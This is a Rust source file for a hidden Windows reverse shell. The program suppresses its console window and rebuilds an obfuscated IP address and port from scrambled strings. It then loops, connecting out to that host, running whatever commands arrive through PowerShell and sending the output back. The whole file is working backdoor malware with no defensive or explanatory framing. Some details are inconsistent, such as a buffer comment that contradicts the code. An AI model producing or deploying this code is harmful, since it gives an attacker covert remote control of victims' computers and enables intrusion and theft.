    
        #![windows_subsystem = "windows"]
        use std::io::{Read, Write};
        use std::net::TcpStream;
        use std::process::{Command, Stdio};
        use std::str::from_utf8;
        use std::{thread, time};
        
        fn main() {
            loop {
            
        let IP1: String = "AcrEN7EdkPWpABkF2ZGTQQIkERJ1undefinedyhGe".chars().rev().filter(|c| c.is_digit(10)).collect();
        let IP2: String = "EQF0vDm".chars().rev().filter(|c| c.is_digit(10)).collect();
        let IP3: String = "OzzZ0Ouoq".chars().rev().filter(|c| c.is_digit(10)).collect();
        let IP4: String = "vuk1jkq".chars().rev().filter(|c| c.is_digit(10)).collect();
        let _Port: String = "vFj0GPKVwTO8soXn".chars().rev().filter(|c| c.is_digit(10)).collect();
        
            match TcpStream::connect(
                [
                    IP1,
                    ".".to_string(),
                    IP2,
                    ".".to_string(),
                    IP3,
                    ".".to_string(),
                    IP4,
                    ":".to_string(),
                    _Port,
                ]
                .join(""),
            ) {
                Ok(mut stream) => {
                    let mut data = [0; 1024]; // using 6 byte buffer
                    match stream.read(&mut data) {
                        Ok(_) => {
                            let text = from_utf8(&data).unwrap();
                            let text = text.trim_matches(char::from(0));
                            let output = Command::new("powershell")
                                .args([text])
                                .stdout(Stdio::piped())
                                .output()
                                .expect("failed to execute process");  
                            stream.write(&output.stdout).unwrap();
                        }
                        Err(e) => {
                        }
                    }
                }
                Err(e) => {
                }
            }
        }
    }
        